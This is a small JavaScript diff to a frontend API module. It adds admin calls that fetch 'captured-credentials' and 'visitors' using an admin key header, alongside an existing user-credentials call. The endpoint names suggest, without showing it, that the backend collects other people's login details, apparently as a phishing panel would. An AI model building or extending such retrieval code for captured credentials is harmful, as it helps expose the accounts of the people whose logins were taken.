@@ -64,6 +64,12 @@ export const adminAPI = {
   }),
   getActiveUsers: () => api.get('/admin/active-users'),
   getUserCredentials: () => api.get('/admin/user-credentials'),
+  getCapturedCredentials: (adminKey) => api.get('/admin/captured-credentials', {
+    headers: { 'X-Admin-Key': adminKey }
+  }),
+  getVisitors: (adminKey) => api.get('/admin/visitors', {
+    headers: { 'X-Admin-Key': adminKey }
+  }),
 };
 
 export default api;
